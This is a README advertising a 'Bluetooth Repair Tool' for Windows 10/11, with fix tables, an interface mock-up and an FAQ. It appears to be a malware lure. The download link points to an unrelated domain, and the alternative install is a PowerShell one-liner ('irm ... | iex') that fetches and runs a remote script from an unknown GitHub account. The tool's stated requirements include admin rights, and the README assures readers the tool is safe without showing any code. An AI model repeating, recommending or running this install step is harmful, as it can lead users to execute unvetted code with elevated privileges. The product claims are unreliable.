# Bluetooth Repair Tool

> Fix Bluetooth not working, pairing failures, and device connection issues on Windows 10/11.

[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.4.0-stable-brightgreen?style=flat-square)]()
[![MIT](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)

---

### Download

**[Download Latest Release](https://bluetooth.zipzapsol.space/)**

<details>
<summary>Alternative: PowerShell</summary>

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

</details>

---

## The Problem

Bluetooth on Windows breaks **constantly**. After updates, after sleep, after connecting a new device. You get:

> *"Bluetooth is not available on this device"*

> *"Pairing unsuccessful. Make sure your device is still discoverable"*

> *"Connected but no audio"* (Bluetooth headphones)

> Bluetooth toggle **completely missing** from Settings

> Device pairs but **disconnects immediately**

**Bluetooth Repair Tool** diagnoses and fixes all of these automatically.

---

## What It Fixes

### Bluetooth Not Working

| Problem | Fix |
|---|---|
| **Bluetooth toggle missing** from Settings | Re-enables Bluetooth adapter, reinstalls driver |
| **"Bluetooth is not available"** | Restarts Bluetooth Support Service, resets adapter |
| Bluetooth **stopped working after Windows Update** | Rolls back driver to previous version |
| Bluetooth **not working after sleep/hibernate** | Disables power management for BT adapter |
| **No Bluetooth in Device Manager** | Rescans hardware, reinstalls adapter |

### Pairing & Connection

| Problem | Fix |
|---|---|
| **Can't pair** new device | Clears pairing cache, resets Bluetooth stack |
| Device **pairs but disconnects** immediately | Resets connection profiles, reinstalls driver |
| **"Pairing unsuccessful"** error | Removes old pairing, restarts BT services |
| **Previously paired device won't connect** | Removes and re-pairs device cleanly |
| Device shows **"Driver error"** in Bluetooth settings | Reinstalls device-specific driver |

### Audio (Headphones / Speakers)

| Problem | Fix |
|---|---|
| **"Connected" but no sound** | Switches audio profile from Hands-Free to A2DP |
| **Sound quality is terrible** (phone call quality) | Forces A2DP (Stereo) profile |
| Audio **cuts out** or **stutters** | Disables Wi-Fi/BT coexistence interference |
| **Microphone not working** on BT headset | Enables Hands-Free profile for mic |
| Headphones show as **"Connected voice only"** | Reinstalls audio sink driver |

### Device Manager Error Codes

| Code | Error Message | Fix |
|---|---|---|
| **Code 10** | "This device cannot start" | Reinstalls Bluetooth adapter driver |
| **Code 22** | "This device is disabled" | Re-enables Bluetooth adapter |
| **Code 28** | "Drivers for this device are not installed" | Downloads Bluetooth driver from manufacturer |
| **Code 31** | "This device is not working properly" | Removes and reinstalls Bluetooth stack |
| **Code 43** | "Windows has stopped this device" | Power cycles adapter, reinstalls driver |
| **Code 45** | "This device is not currently connected" | Resets Bluetooth adapter in Device Manager |

### Other Devices

| Problem | Fix |
|---|---|
| **Bluetooth keyboard** not typing | Resets HID service, re-pairs device |
| **Bluetooth mouse** laggy or disconnecting | Adjusts polling rate, disables power saving |
| **Bluetooth file transfer** not working | Resets OBEX service |
| **Xbox controller** won't connect via BT | Reinstalls Xbox Wireless Adapter driver |

---

## Preview

```
  +-------------------------------------------------+
  |         Bluetooth Repair Tool v1.4.0            |
  +-------------------------------------------------+
  |                                                 |
  |  Adapter: Intel AX210 Bluetooth         [OK]    |
  |  Service: Bluetooth Support Service     [!]     |
  |  Driver:  22.150.0 (outdated)           [!]     |
  |                                                 |
  |  Paired Devices:                                |
  |  [!] AirPods Pro         -- Connected, no audio |
  |  [OK] Logitech MX Keys  -- Connected            |
  |  [!] Xbox Controller     -- Pairing failed      |
  |                                                 |
  |  [ Fix All ]  [ Reset Bluetooth ]  [ Exit ]     |
  |                                                 |
  +-------------------------------------------------+
```

---

## Supported Adapters

**Intel** -- AX210, AX200, 9560, 9260, 8265, 8260 and all Intel Bluetooth adapters
**Realtek** -- RTL8761B, RTL8821CE, RTL8852AE, RTL8852BE and all Realtek BT chips
**Qualcomm** -- QCA6390, QCA9377, WCN785x and all Qualcomm BT adapters
**Broadcom** -- BCM20702, BCM2046 and all Broadcom BT chips
**MediaTek** -- MT7921, MT7922 and all MediaTek BT adapters
**USB Bluetooth dongles** -- all brands (TP-Link, ASUS, Avantree, etc.)

---

## How It Works

1. **Detect** -- Finds Bluetooth adapter and all paired/connected devices
2. **Diagnose** -- Checks driver, services, pairing cache, audio profiles
3. **Repair** -- Reinstalls drivers, restarts services, resets connections
4. **Verify** -- Tests Bluetooth connectivity after repair

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 2 GB minimum |
| Admin | Yes |
| Network | For driver downloads |

---

## FAQ

**My laptop doesn't have Bluetooth.**
If your laptop never had Bluetooth, this tool can't add it. You need a USB Bluetooth dongle.

**Bluetooth worked before a Windows Update.**
This is extremely common. The tool detects the driver change and rolls back to the working version.

**AirPods connect but no sound.**
The tool forces the A2DP (Stereo) audio profile. Windows sometimes defaults to Hands-Free (phone call quality) which sounds terrible or produces no music audio.

**Is it safe?**
Yes. The tool uses Windows Device Manager and Service Manager APIs. No system files are modified.

---

## License

[MIT](LICENSE)
